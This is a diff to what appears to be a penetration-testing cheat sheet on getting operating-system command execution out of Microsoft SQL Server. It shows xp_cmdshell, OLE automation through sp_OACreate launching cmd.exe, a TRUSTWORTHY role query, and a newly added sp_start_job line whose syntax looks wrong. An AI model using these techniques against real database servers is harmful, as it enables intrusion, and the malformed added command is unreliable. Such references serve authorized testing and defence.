@@ -486,6 +486,9 @@ EXECUTE xp_cmdshell 'whoami';
 # ole automation
 DECLARE @objShell INT; DECLARE @output varchar(8000); EXEC @output = sp_OACreate 'wscript.shell', @objShell Output; EXEC sp_OAMethod @objShell, 'run', NULL, 'cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"';
 
+# job
+sp_start_job cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"
+
 # trustworthy
 ## Abuse NULL
 SELECT b.name, c.name FROM [DBname].sys.database_role_members a JOIN [DBname].sys.database_principals b ON a.role_principal_id = b.principal_id LEFT JOIN [DBname].sys.database_principals c ON a.member_principal_id = c.principal_id;
